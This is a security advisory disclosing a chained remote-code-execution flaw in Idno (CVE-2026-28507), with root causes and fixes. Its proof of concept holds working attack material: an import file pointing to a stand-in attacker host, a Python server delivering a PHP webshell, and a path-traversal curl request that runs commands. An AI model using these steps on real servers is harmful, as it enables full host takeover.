# [H] Idno Vulnerable to Remote Code Execution via Chained Import File Write and Template Path Traversal

## Summary
Severity: High
Advisory: GHSA-37j7-56xc-c468
CVE: CVE-2026-28507
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-03-02
Source: https://github.com/advisories/GHSA-37j7-56xc-c468
Type: github-advisory

## Affected
- Packagist: `idno/known` — affected >=0 <1.6.4

## Details
**Affected Versions:** Tested on current `dev` branch (build fingerprint `505[...]7bd86`)  
**CVSS v4 Score:** 8.6 ([CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N))
**Privileges Required:** Web application admin account (for file write), any authenticated user (for RCE trigger)

---

## Summary

Two separate vulnerabilities in Idno can be chained to achieve RCE from a web application admin account. A web application admin can cause the server to fetch an attacker-controlled URL during WordPress import processing, writing a PHP file to the server's temp directory. The admin or a separate, lower-privileged authenticated user can then trigger inclusion of that file via an unsanitized template name parameter, executing arbitrary operating system commands as the web server user.

---

## Vulnerability 1: Arbitrary PHP File Write via WordPress Import (SSRF + File Write)

### Location

`Idno/Core/Migration.php` — `importImagesFromBodyHTML()`

### Required Privilege

Web application admin (any user with the `admin` flag set in the database, accessible via the Idno admin UI).

### Description

When a web application admin imports a WordPress eXtended RSS (WXR) XML file via `POST /admin/import/`, the application processes `<img>` tags in post body content and attempts to re-host images locally. The function`importImagesFromBodyHTML()` fetches each image URL using `fopen()` and writes the response body to a temp file whose name is derived from the URL.

The filename is constructed as:

```php
$name = md5($src);
$newname = $dir . $name . basename($src);
```

Where `$src` is the full image URL from the XML and `basename($src)` is the filename component of that URL. Because `basename()` is applied to the URL string rather than a sanitized path, an attacker who controls the URL can make `basename()` return any filename — including one ending in `.tpl.php`.

The URL filter is:

```php
if (substr_count($src, $src_url)) {
```

Where `$src_url` is the hardcoded string `'wordpress.com'`. This check uses `substr_count` rather than comparing the URL's hostname, so it passes for any URL that contains the string `wordpress.com` anywhere — including in a path component such as `http://attacker.com/wordpress.com/shell.tpl.php`.

The file write itself is:

```php
if (@file_put_contents($newname, fopen($src, 'r'))) {
```

`fopen($src, 'r')` opens the attacker URL as a stream. `file_put_contents` reads from the stream in chunks and writes to disk. Because the attacker controls the HTTP server, they can hold the TCP connection open after sending the PHP payload — causing `file_put_contents` to block while the file sits on disk with its full content. The file is only deleted after `file_put_contents` returns:

```php
if ($file = File::createFromFile($newname, basename($src), $mime, true)) {
    $newsrc = ...;
    @unlink($newname);  // only runs after file_put_contents returns
}
```

By holding the connection open, the attacker controls how long the file exists on disk, creating an exploitable window.

The import endpoint itself adds an additional timing buffer:

```php
// Idno/Pages/Admin/Import.php
session_write_close();
$this->forward(...);      // HTTP response sent to browser here
ignore_user_abort(true);
sleep(10);                // 10 second delay before import runs
set_time_limit(0);
Migration::importWordPressXML($xml);
```

The browser receives a redirect response immediately, and the actual import runs in the background after 10 seconds.

The resulting file is written to PHP's temp directory (typically `/tmp` from the PHP process's perspective, which on systemd-managed Apache is a private mount at `/tmp/systemd-private-{id}-apache2.service-{id}/tmp/`). The filename is predictable: `md5($full_url) . basename($url)`.

### Prerequisites

- Text plugin must be enabled (the import function returns early without it) (this appears to be enabled by default)
- `allow_url_fopen` must be enabled in PHP (required for `fopen($url, 'r')` on remote URLs — this is the PHP default)

---

## Vulnerability 2: Local File Inclusion via Unsanitized Template Name (LFI → RCE)

### Location

`Idno/Pages/Search/User.php` — `getContent()`
`Idno/Core/Bonita/Templates.php` — `draw()`

### Required Privilege

Any authenticated user (`gatekeeper()` only checks `isLoggedIn()`).

### Description

The user search endpoint accepts a `template` GET parameter that is passed without sanitization to the template rendering engine:

```php
// Idno/Pages/Search/User.php
$template = $this->getInput('template', 'forms/components/usersearch/user');
// ...
$t = new \Idno\Core\DefaultTemplate();
$results['rendered'] .= $t->__(['user' => $user])->draw($template);
```

The `draw()` method in `Idno/Core/Bonita/Templates.php` applies only a regex that strips strings beginning with an underscore followed by alphanumeric characters:

```php
function draw($templateName, $returnBlank = true)
{
    $templateName = preg_replace('/^_[A-Z0-9\/]+/i', '', $templateName);
```

This regex does not strip `../` and does not reject path separators. The sanitized name is then joined with a base path and template type directory to construct the include path:

```php
$path = $basepath . '/templates/' . $templateType . '/' . $templateName . '.tpl.php';
if (file_exists($path)) {
    $fn = (function ($path, $vars, $t) {
        foreach ($vars as $k => $v) { ${$k} = $v; }
        ob_start();
        include $path;
        return ob_get_clean();
    });
    return $fn($path, $this->vars, $this);
}
```

Because `$templateName` is user-controlled and contains no path traversal restrictions, an attacker can supply a value such as `../../../../../../tmp/{filename}` to include any file reachable by the PHP process that has a `.tpl.php` extension.

### Template Type Behaviour

The `new DefaultTemplate()` constructor calls `detectTemplateType()`, which calls `detectDevice()` based on the `User-Agent` header. For standard desktop browsers this returns `'default'`. The `_t` query parameter, intended to override the template type, sets the type on the global site template object — not on the locally constructed `$t` instance — and therefore has no effect on the include path used here. The template type component of the path is always `'default'` for this endpoint under normal conditions.

The full resolved include path for a desktop browser with `basepath = /var/www/html/idno` is therefore:

```
/var/www/html/idno/templates/default/{template}.tpl.php
```

Supplying `template=../../../../../../tmp/{filename}` resolves to:

```
/tmp/{filename}.tpl.php
```

Because PHP's `$_GET` superglobal is accessible from all scopes including inside `include`d files, any PHP code in the included file can directly read query string parameters from the original HTTP request without any explicit passing mechanism.

---

## Chained Attack Flow

1. **Attacker controls a web server** serving a PHP webshell file at a URL containing `wordpress.com` in the path, with filename ending in `.tpl.php`.

2. **Attacker constructs a WordPress WXR XML** with an `<img>` tag whose `src` points to this URL.

3. **Admin submits the XML** to `POST /admin/import/` with `import_type=WordPress`. The application responds immediately and runs the import in the background after 10 seconds.

4. **`importImagesFromBodyHTML` is called.** The URL passes the `substr_count($src, 'wordpress.com')` check. `fopen($src, 'r')` connects to the attacker's server, which sends the PHP payload and holds the connection open.

5. **`file_put_contents` writes the PHP payload to disk** at `/tmp/{md5(url)}{basename(url)}` (e.g. `/tmp/594ac6416712b71b978fa4659c4298c3shell.tpl.php`) and blocks waiting for the stream to close.

6. **While the connection is held open**, any authenticated user sends:

   ```
   GET /search/users/?query=a&limit=1&template=../../../../../../tmp/594ac6416712b71b978fa4659c4298c3shell&cmd=id
   ```

7. **`draw()` resolves the path** to `/tmp/594ac6416712b71b978fa4659c4298c3shell.tpl.php`, finds the file exists, and `include`s it.

8. **The included PHP file executes**, reads `$_GET['cmd']` from the superglobal, and passes it to `system()`. Output is captured by `ob_get_clean()` and returned in the `rendered` field of the JSON response.

9. **Attacker closes the connection.** `file_put_contents` returns, `createFromFile` runs, `@unlink` removes the temp file. No persistent artifact remains.

---

## Proof of Concept

1. Create a WXR file with the following content
```xml
<rss version="2.0"
    xmlns:content="http://purl.org/rss/1.0/modules/content/"
    xmlns:wp="http://wordpress.org/export/1.2/">
    <channel>
      <item>
        <title>Test Post</title>
        <wp:post_type>post</wp:post_type>
        <wp:status>publish</wp:status>
        <content:encoded><![CDATA[<img
  src="http://attacker-server-address/wordpress.com/shell.tpl.php">]]></content:encoded>
      </item>
    </channel>
</rss>
```
2. Run a server at `attacker-server-address` and host the file in path `wordpress.com/shell.tpl.php` such that fetching `http://attacker-server-address/wordpress.com/shell.tpl.php` sends the command execution payload. 

```python
import http.server
import time

PAYLOAD = b'<?php system($_GET["cmd"]); ?>'


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers()
        self.wfile.write(PAYLOAD)
        self.wfile.flush()
        print(f"[*] Payload sent. Holding connection open...")
        time.sleep(45)  # hold connection open for 45s
        print(f"[*] Connection released")

    def log_message(self, fmt, *args):
        print(fmt % args)


http.server.HTTPServer(("0.0.0.0", 9876), Handler).serve_forever()
```

5. Import WXR from `http://idno-address/admin/import/` using the wordpress option.

6. Wait till the server receives a connection. In my server example, the connection remains open for 45 seconds which is enough time to exploit the issue.

7. Compute the md5 hash of payload URL `http://attacker-server-address/wordpress.com/shell.tpl.php`. In my example this is `594ac6416712b71b978fa4659c4298c3`. This means the webshell file is `594ac6416712b71b978fa4659c4298c3shell.tpl.php` with content 
```php
<?php system($_GET[0]); ?>
```

8. Make this request as any authenticated user
```
curl -k \
  -b "idno=<cookie>" \
  "http://idno-address/search/users/?query=a&limit=1&template=../../../../../../tmp/594ac6416712b71b978fa4659c4298c3shell&_t=rss&cmd=id"

```

9. Observe that the respone will have the command executed in the `rendered` field
```
{"count":1,"rendered":"uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(pihole)\n"}
```


https://github.com/user-attachments/assets/9f36ce0e-8f73-42ba-908d-eb91cc4879b4



---

## Impact

- **Confidentiality:** Full read access to files accessible by the web server user
- **Integrity:** Arbitrary command execution as the web server user
- **Availability:** Complete compromise of the host running Idno

An attacker who obtains a web application admin account (via credential theft, weak password, or other means) can escalate to OS-level code execution. The RCE trigger itself requires only a standard authenticated session, meaning the admin account is needed only for the file write stage.

---

## Root Causes

| Location | Issue |
|---|---|
| `Migration.php:importImagesFromBodyHTML` | `basename($url)` used as filename with no extension restriction |
| `Migration.php:importImagesFromBodyHTML` | `substr_count` hostname check trivially bypassed by embedding `wordpress.com` in URL path |
| `Migration.php:importImagesFromBodyHTML` | Outbound `fopen()` to attacker-controlled URL with no SSRF mitigation |
| `Pages/Search/User.php` | `template` parameter passed to `draw()` without sanitization |
| `Core/Bonita/Templates.php:draw()` | Regex strips only `^_[A-Z0-9/]+` prefix — does not restrict `../` or path separators |

---

## Recommended Fixes

1. **Restrict allowed template name characters** in `draw()` to an allowlist such as `^[a-z0-9/_-]+$`, rejecting any name containing `..` or beginning with `/`.

2. **Validate the extension of files written by `importImagesFromBodyHTML`** against an allowlist of image extensions (jpg, jpeg, png, gif, webp) before writing to disk.

3. **Validate the hostname of image URLs** in `importImagesFromBodyHTML` against the source domain rather than using `substr_count`, which does not distinguish hostname from path.

4. **Use `tempnam()`** for temp files in the import flow rather than constructing filenames from user-controlled URL components.

## References
- https://github.com/idno/idno/security/advisories/GHSA-37j7-56xc-c468
- https://nvd.nist.gov/vuln/detail/CVE-2026-28507
- https://github.com/idno/idno
- https://github.com/idno/idno/releases/tag/1.6.4
